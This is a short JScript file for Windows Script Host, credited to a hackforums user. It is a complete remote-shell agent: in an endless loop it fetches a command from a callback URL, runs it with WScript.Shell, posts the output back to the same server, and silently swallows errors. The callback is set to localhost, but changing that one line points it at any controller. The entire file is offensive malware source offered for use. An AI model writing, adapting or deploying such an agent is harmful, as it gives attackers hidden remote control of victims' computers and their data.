// coded by darksel0  ....2024
//https://github.com/Darksel0
//hackforums.net username:darkosel
var callbackUrl = "http://127.0.0.1:80/";

function main() {
    var breakLoop = false;

    while (!breakLoop) {
        try {
            
            var httpRequest = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
            httpRequest.open("GET", callbackUrl, false);
            httpRequest.send();

            var command = httpRequest.responseText.trim();

            if (command.indexOf("EXIT") !== -1) {
                breakLoop = true;
            } else {
               
                var shell = new ActiveXObject("WScript.Shell");
                var exec = shell.Exec(command);
                var result = "";

                
                while (exec.Status === 0) {
                    WScript.Sleep(100);
                }
                result = exec.StdOut.ReadAll();

                
                var postRequest = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
                postRequest.open("POST", callbackUrl, false);
                postRequest.setRequestHeader("Content-Type", "text/plain");
                postRequest.send(result);
            }
        } catch (e) {
            
           
        }
    }
}

main();
